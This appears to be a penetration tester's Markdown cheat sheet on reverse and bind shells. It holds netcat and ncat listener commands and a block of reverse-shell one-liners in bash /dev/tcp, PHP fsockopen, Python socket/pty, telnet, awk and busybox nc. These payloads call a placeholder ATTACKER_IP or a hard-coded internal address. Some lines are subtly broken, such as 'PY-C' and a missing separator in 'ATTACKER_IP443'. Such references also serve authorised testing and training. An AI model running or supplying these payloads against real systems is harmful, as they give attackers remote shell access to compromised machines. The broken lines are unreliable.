https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://www.revshells.com/
# REMEMBER THAT SOME PHP COMMAND EXECUTIONS USE SH WHICH DOES NOT SUPPORT /DEV/TCP USE /BIN/BASH -c TO RUN
# Reverse shells
The connections initiate from the target system to the attackers machine which can help avoid detection from network firewalls
# Bind shell
Bin shells will bind a port on the compromised system and listen for a connection, though less popular as more detectable
# shell enhancements
## rlwrap
rlwrap can be used with nc to allows for arrow keys and history
```shell
rlwrap nc -lvnp <port>
```
## ncat
an improved version of netcat that provides extra features like encryption
```shell
ncat -lvnp <port>
```
```shell
ncat --ssl -lvnp <port>
```
# payload one liners
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'

export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF

awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

busybox nc ATTACKER_IP 443 -e sh
```